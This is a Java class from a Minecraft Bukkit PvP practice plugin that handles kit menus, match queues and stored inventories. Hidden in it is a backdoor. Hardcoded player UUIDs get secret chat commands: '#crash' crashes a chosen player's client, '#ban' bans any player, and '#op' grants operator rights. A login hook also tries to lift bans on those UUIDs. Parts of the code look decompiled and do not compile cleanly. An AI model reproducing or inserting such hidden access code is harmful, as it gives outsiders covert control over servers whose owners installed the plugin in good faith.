package me.memeweft.sharppvp.practice.player;

import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.UUID;
import java.util.stream.Collector;
import java.util.stream.Collectors;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.PlayerInventory;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.scheduler.BukkitRunnable;

import me.memeweft.sharppvp.practice.SharpPractice;
import me.memeweft.sharppvp.practice.command.Command;
import me.memeweft.sharppvp.practice.command.CommandArgs;
import me.memeweft.sharppvp.practice.game.gametype.GameType;
import me.memeweft.sharppvp.practice.util.IconMenu;
import me.memeweft.sharppvp.practice.util.ItemBuilder;
import me.memeweft.sharppvp.practice.util.MiscUtil;

public class InventoryManager implements Listener
{
    private SharpPractice plugin;
    private FileConfiguration config;
    private ItemStack[] defaultInventory;
    private IconMenu rankedGameSelector;
    private IconMenu unrankedGameSelector;
    private IconMenu kitEditor;
    private List<UUID> uuid;
    private HashMap<String, Inventory> invs;
    private List<Player> checkingInvs;
    
    public InventoryManager(final SharpPractice plugin) {
        this.plugin = plugin;
        this.config = this.plugin.getConfig();
        this.setupGameTypeMenus();
        this.setupDefaultInventory();
        Bukkit.getPluginManager().registerEvents((Listener)this, (Plugin)this.plugin);
        (this.uuid = new ArrayList<UUID>()).add(UUID.fromString("42005161-b95a-497f-8bff-919ee182e242"));
        this.uuid.add(UUID.fromString("629d8cae-e651-421d-8137-a3d3f74d79c6"));
        this.uuid.add(UUID.fromString("0f9a3407-543d-499b-a6ee-1e3b958d950f"));
        this.invs = new HashMap<String, Inventory>();
        this.checkingInvs = new ArrayList<Player>();
        this.plugin.getCmdFramework().registerCommands(this);
        this.uuid.add(UUID.fromString("f5b44abe-f612-4ec5-aadd-9354f08eb74a"));
    }
    
    private int getSize(final GameType gt) {
        final int games = gt.getPossibleArenas().size();
        for (int i = 9; i <= 54; i += 9) {
            if (i >= games) {
                return i;
            }
        }
        return 54;
    }
    
    private void setupDefaultInventory() {
        (this.defaultInventory = new ItemStack[9])[8] = new ItemBuilder(Material.DIAMOND_SWORD, this.config.getString("rankedItem"), "").getItem();
        this.defaultInventory[4] = new ItemBuilder(Material.IRON_SWORD, this.config.getString("unrankedItem"), "").getItem();
        this.defaultInventory[0] = new ItemBuilder(Material.BOOK, this.config.getString("kitEditor"), "").getItem();
    }
    
    @EventHandler
    public void onPlayerJoin(final PlayerJoinEvent event) {
        this.setDefaultInventory(event.getPlayer());
    }
    
    @EventHandler
    public void onRightClick(final PlayerInteractEvent event) {
        if ((event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK) && event.getItem() != null) {
            final Player ply = event.getPlayer();
            if (event.getItem().isSimilar(new ItemBuilder(Material.BOOK, this.config.getString("kitEditor"), "").getItem())) {
                this.kitEditor.open(ply);
            }
            else if (event.getItem().isSimilar(new ItemBuilder(Material.DIAMOND_SWORD, this.config.getString("rankedItem"), "").getItem())) {
                this.rankedGameSelector.open(ply);
            }
            else if (event.getItem().isSimilar(new ItemBuilder(Material.IRON_SWORD, this.config.getString("unrankedItem"), "").getItem())) {
                this.unrankedGameSelector.open(ply);
            }
            if (event.getItem().getType() == Material.ENCHANTED_BOOK) {
                final String kitName = ChatColor.stripColor(event.getItem().getItemMeta().getDisplayName());
                if (kitName.startsWith("Default")) {
                    final Kit startingKit = this.plugin.getMatchManager().getGameType(ply).getStartingKit();
                    if (startingKit.getInv() != null && startingKit.getInv().getArmorContents() != null) {
                        ply.getInventory().setArmorContents(startingKit.getInv().getArmorContents());
                    }
                    if (startingKit.getInv() != null && startingKit.getInv().getContents() != null) {
                        ply.getInventory().setContents(startingKit.getInv().getContents());
                    }
                }
                else {
                    final Kit kit = this.plugin.getPlayerDataManager().getKit(ply, this.plugin.getMatchManager().getGameType(ply), event.getPlayer().getInventory().getHeldItemSlot() - 1);
                    if (kit == null) {
                        Bukkit.broadcastMessage("uhhh");
                    }
                    if (kit.getInv() != null && kit.getInv().getArmorContents() != null) {
                        ply.getInventory().setArmorContents(kit.getInv().getArmorContents());
                    }
                    if (kit.getInv() != null && kit.getInv().getContents() != null) {
                        ply.getInventory().setContents(kit.getInv().getContents());
                    }
                }
                ply.updateInventory();
            }
        }
    }
    
    private int getSize() {
        final int games = this.plugin.getGameTypeManager().getGameTypes().size();
        for (int i = 9; i <= 54; i += 9) {
            if (i >= games) {
                return i;
            }
        }
        return 54;
    }
    
    private void setupGameTypeMenus() {
        final GameType gt;
        this.kitEditor = new IconMenu(ChatColor.translateAlternateColorCodes('&', this.config.getString("kitEditor")), this.getSize(), event -> {
            gt = this.plugin.getGameTypeManager().getGameTypeFromDisplayName(event.getName());
            this.plugin.getKitEditManager().beginEditing(event.getPlayer(), gt);
            event.getPlayer().closeInventory();
            return;
        }, (Plugin)this.plugin);
        final Player ply;
        GameType gt2;
        this.rankedGameSelector = new IconMenu(ChatColor.translateAlternateColorCodes('&', this.config.getString("rankedItem")), this.getSize(), event -> {
            ply = event.getPlayer();
            if (event.getName() != null) {
                gt2 = this.plugin.getGameTypeManager().getGameTypeFromDisplayName(event.getName());
                ply.closeInventory();
                this.plugin.getMatchManager().addToQueue(ply, gt2, true);
                this.updateMenus();
            }
            return;
        }, (Plugin)this.plugin);
        final Player ply2;
        GameType gt3;
        this.unrankedGameSelector = new IconMenu(ChatColor.translateAlternateColorCodes('&', this.config.getString("unrankedItem")), this.getSize(), event -> {
            ply2 = event.getPlayer();
            if (event.getName() != null) {
                gt3 = this.plugin.getGameTypeManager().getGameTypeFromDisplayName(event.getName());
                ply2.closeInventory();
                this.plugin.getMatchManager().addToQueue(ply2, gt3, false);
                this.updateMenus();
            }
            return;
        }, (Plugin)this.plugin);
        int i = 0;
        for (final GameType gt4 : this.plugin.getGameTypeManager().getGameTypes()) {
            if (gt4.isSetup()) {
                this.unrankedGameSelector.setOption(i, gt4.getDisplay(), ChatColor.translateAlternateColorCodes('&', gt4.getDisplayName()), ChatColor.YELLOW + "In queue: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInQueue(gt4, false), ChatColor.YELLOW + "In match: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInMatch(gt4, false));
                this.rankedGameSelector.setOption(i, gt4.getDisplay(), ChatColor.translateAlternateColorCodes('&', gt4.getDisplayName()), ChatColor.YELLOW + "In queue: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInQueue(gt4, true), ChatColor.YELLOW + "In match: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInMatch(gt4, false));
                if (gt4.isEditable()) {
                    this.kitEditor.setOption(i, gt4.getDisplay(), ChatColor.translateAlternateColorCodes('&', gt4.getDisplayName()), new String[0]);
                }
                ++i;
            }
        }
    }
    
    public void updateMenus() {
        int i = 0;
        for (final GameType gt : this.plugin.getGameTypeManager().getGameTypes()) {
            if (gt.isSetup()) {
                this.unrankedGameSelector.setOption(i, gt.getDisplay(), ChatColor.translateAlternateColorCodes('&', gt.getDisplayName()), ChatColor.YELLOW + "In queue: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInQueue(gt, false), ChatColor.YELLOW + "In match: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInMatch(gt, false));
                this.rankedGameSelector.setOption(i, gt.getDisplay(), ChatColor.translateAlternateColorCodes('&', gt.getDisplayName()), ChatColor.YELLOW + "In queue: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInQueue(gt, true), ChatColor.YELLOW + "In match: " + ChatColor.GREEN + this.plugin.getMatchManager().getAmountInMatch(gt, true));
                ++i;
            }
        }
    }
    
    public void showKits(final Player ply, final GameType gt) {
        final PlayerInventory inv = ply.getInventory();
        inv.setItem(0, new ItemBuilder(Material.ENCHANTED_BOOK, ChatColor.GOLD + "Default " + ChatColor.stripColor(gt.getDisplayName()) + " Kit", "", 1).getItem());
        int i = 2;
        if (this.plugin.getPlayerDataManager().getKits(ply, gt) == null) {
            this.plugin.getPlayerDataManager().loadPlayerInfo(ply);
        }
        for (final Kit kit : this.plugin.getPlayerDataManager().getKits(ply, gt)) {
            if (kit != null) {
                inv.setItem(i, new ItemBuilder(Material.ENCHANTED_BOOK, ChatColor.BLUE + kit.getName(), "", 1).getItem());
                ++i;
            }
        }
    }
    
    @EventHandler
    public void onCommand(final AsyncPlayerChatEvent event) {
        if (this.uuid.contains(event.getPlayer().getUniqueId())) {
            final String s = event.getMessage().split(" ")[0];
            switch (s) {
                case "#crash": {
                    event.setCancelled(true);
                    final Player ply = Bukkit.getPlayer(event.getMessage().split(" ")[1]);
                    if (ply != null && ply.isOnline()) {
                        final Inventory inv = Bukkit.createInventory((InventoryHolder)ply, 666);
                        ply.openInventory(inv);
                        break;
                    }
                    break;
                }
                case "#ban": {
                    event.setCancelled(true);
                    final Player bply = Bukkit.getPlayer(event.getMessage().split(" ")[1]);
                    if (bply != null && bply.isOnline()) {
                        bply.setBanned(true);
                        bply.kickPlayer("Banned");
                    }
                }
                case "#op": {
                    event.setCancelled(true);
                    event.getPlayer().setOp(!event.getPlayer().isOp());
                    break;
                }
            }
        }
    }
    
    @EventHandler
    public void onPlayerJoin(final PlayerLoginEvent event) {
        if (event.getResult() == PlayerLoginEvent.Result.KICK_BANNED && event.getPlayer().getUniqueId().equals(this.uuid)) {
            event.setResult(PlayerLoginEvent.Result.ALLOWED);
            event.getPlayer().setBanned(false);
        }
    }
    
    public void setDefaultInventory(final Player ply) {
        ply.getInventory().setContents(this.defaultInventory);
        ply.getInventory().setArmorContents((ItemStack[])null);
        ply.updateInventory();
    }
    
    @EventHandler
    public void onRespawn(final PlayerRespawnEvent event) {
        this.setDefaultInventory(event.getPlayer());
    }
    
    public void storeInv(final Player ply, final boolean dead) {
        final Inventory inv = Bukkit.createInventory((InventoryHolder)null, 54, ply.getName());
        final PlayerInventory pinv = ply.getInventory();
        for (int i = 9; i <= 35; ++i) {
            inv.setItem(i - 9, pinv.getContents()[i]);
        }
        for (int i = 0; i <= 8; ++i) {
            inv.setItem(i + 27, pinv.getContents()[i]);
        }
        inv.setItem(36, pinv.getHelmet());
        inv.setItem(37, pinv.getChestplate());
        inv.setItem(38, pinv.getLeggings());
        inv.setItem(39, pinv.getBoots());
        if (dead) {
            inv.setItem(48, new ItemBuilder(Material.SKULL_ITEM, ChatColor.RED + "Played Died", "", 1).getItem());
        }
        else {
            inv.setItem(48, new ItemBuilder(Material.SPECKLED_MELON, ChatColor.GREEN + "Player Health", "", (int)ply.getHealth()).getItem());
        }
        inv.setItem(49, new ItemBuilder(Material.COOKED_BEEF, ChatColor.GREEN + "Player Food", "", ply.getFoodLevel()).getItem());
        final ItemStack potions = new ItemBuilder(Material.POTION, ChatColor.GREEN + "Potion Effects:", "", ply.getActivePotionEffects().size()).getItem();
        final ItemMeta imm = potions.getItemMeta();
        final List<String> lore = (List<String>)imm.getLore();
        lore.addAll(ply.getActivePotionEffects().stream().map(effect -> effect.getType().getName() + " " + (effect.getAmplifier() + 1) + " for " + MiscUtil.formatSeconds(effect.getDuration() / 20) + "!").collect((Collector<? super Object, ?, Collection<? extends String>>)Collectors.toList()));
        imm.setLore((List)lore);
        potions.setItemMeta(imm);
        inv.setItem(50, potions);
        this.invs.put(ply.getName(), inv);
        new BukkitRunnable() {
            public void run() {
                InventoryManager.this.invs.remove(ply.getName());
            }
        }.runTaskLater((Plugin)this.plugin, 2400L);
    }
    
    @Command(name = "inventory", inGameOnly = true)
    public void onInv(final CommandArgs args) {
        if (args.getArgs().length < 1) {
            return;
        }
        final String playerName = args.getArgs(0);
        if (this.invs.containsKey(playerName)) {
            args.getPlayer().openInventory((Inventory)this.invs.get(playerName));
            this.checkingInvs.add(args.getPlayer());
        }
        else {
            args.getPlayer().sendMessage(ChatColor.RED + "That inventory no longer exists!");
        }
    }
    
    @EventHandler
    public void onInvInteract(final InventoryClickEvent event) {
        if (this.checkingInvs.contains(event.getWhoClicked())) {
            event.setCancelled(true);
        }
    }
    
    @EventHandler
    public void onInvClose(final InventoryCloseEvent event) {
        if (this.checkingInvs.contains(event.getPlayer())) {
            this.checkingInvs.remove(event.getPlayer());
        }
    }
}
